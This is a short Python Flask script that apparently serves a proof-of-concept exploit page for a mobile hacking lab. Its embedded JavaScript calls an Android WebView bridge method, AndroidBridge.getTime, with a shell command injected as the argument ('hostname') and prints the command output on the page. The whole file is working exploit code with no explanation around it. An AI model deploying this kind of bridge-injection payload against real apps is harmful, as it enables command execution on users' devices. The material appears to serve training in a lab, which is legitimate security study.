from flask import Flask, Response

app = Flask(__name__)

html = """
<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Exploit Page Loaded Successfully</h1>
    <script>
       
        var output = AndroidBridge.getTime("hostname ");
        
        
        document.write("<h3>Command Execution Output:</h3>");
        document.write("<pre>" + output + "</pre>");
    </script>
</body>
</html>
"""

@app.route("/mobilehackinglab.com")
def index():
    return Response(html, mimetype="text/html")

app.run(host="0.0.0.0", port=8000)